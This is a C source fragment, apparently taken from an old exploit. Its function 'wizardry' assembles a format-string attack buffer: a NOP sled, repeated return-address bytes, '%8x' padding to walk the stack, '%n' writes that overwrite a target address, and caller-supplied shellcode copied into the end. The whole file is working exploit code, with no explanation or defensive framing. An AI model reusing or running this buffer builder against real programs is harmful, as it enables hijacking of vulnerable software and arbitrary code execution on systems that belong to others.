
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int u_long ;


 int EXIT_FAILURE ;
 char NOP ;
 int exit (int ) ;
 int fprintf (int ,char*) ;
 char* malloc (int) ;
 int memcpy (char*,char*,int) ;
 int memset (char*,char,int) ;
 int perror (char*) ;
 int printf (char*,int,...) ;
 int sprintf (char*,char*,...) ;
 int stderr ;
 int strlen (char*) ;
 int strncpy (char*,char*,int) ;

char *
wizardry(char *sc, u_long bufpos, int buflen, int offset, int wipe)
{
    int i, j, cnt, pad;
    char pbyte, *buff, *ptr;
    u_long retpos;
    u_long dstpos;


    while(bufpos % 4) bufpos--;

    retpos = bufpos + buflen + 4;
    pbyte = retpos & 0xff;


    if(pbyte == 0x00 || pbyte == 0x24)
    {
        fprintf(stderr, "Target address space contains a poison char\n");
        exit(EXIT_FAILURE);
    }







    cnt = 24;

    buflen -= cnt + 1;

    if(!(buff = malloc(buflen + 1)))
    {
        perror("malloc()");
        exit(EXIT_FAILURE);
    }

    ptr = buff;
    memset(ptr, NOP, buflen);

    for(i = 0; i < 4; i++, retpos++)
    {

        for(j = 0; j < 4; j++)
            *ptr++ = retpos >> j * 8 & 0xff;

        memcpy(ptr, ptr - 4, 4);
        ptr += 4; cnt += 8;
    }


    retpos -= 4;

    for(i = 0; i < wipe; i++)
    {

        strncpy(ptr, "%8x", 3);
        ptr += 3; cnt += 8;
    }

    dstpos = bufpos + offset;






    for(i = 0; i < 4; i++)
    {
        pad = dstpos >> i * 8 & 0xff;
        if(pad == (cnt & 0xff))
        {
            sprintf(ptr, "%%n%%n");
            ptr += 4; continue;
        }
        else
        {
            int tmp;

            while(pad < cnt || pad % cnt <= 8) pad += 0x100;
            pad -= cnt, cnt += pad;

            tmp = sprintf(ptr, "%%%dx%%n", pad);
            ptr += tmp;
        }

    }

    *ptr = NOP;

    memcpy(buff + buflen - strlen(sc), sc, strlen(sc));
    buff[buflen] = '\0';

    printf("buffer: %#lx length: %d (+str/+nul)\n", bufpos, strlen(buff));
    printf("target: %#lx new: %#lx (offset: %d)\n", retpos, dstpos, offset);
    printf("wiping %d dwords\n", wipe);
    return buff;
}
